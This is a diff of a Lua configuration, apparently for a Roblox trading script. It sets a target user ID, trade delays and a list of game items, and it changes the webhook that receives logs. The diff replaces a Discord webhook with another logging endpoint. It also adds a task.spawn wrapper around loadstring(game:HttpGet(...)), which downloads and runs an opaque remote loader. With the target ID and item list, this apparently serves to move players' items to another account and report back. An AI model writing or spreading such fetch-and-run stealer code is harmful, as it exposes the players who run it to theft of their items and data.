@@ -1,4 +1,4 @@
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1480371520353341471/TjwlUg9gGQV9txfjqdjY5piJPsPU7L-ahi8wvVyHKYtRE0o8dKClT3ax4U3-pLYvVAXC"
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_faf4636a53e141b5812db406863e45b7"
 getgenv().TARGET_ID = 2739008280
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2 
@@ -80,4 +80,6 @@ getgenv().TARGET_BRAINROTS = {
     ["Los Sweethearts"] = true,
     ["Nooo My Hotspot"] = true
 }
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
+task.spawn(function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
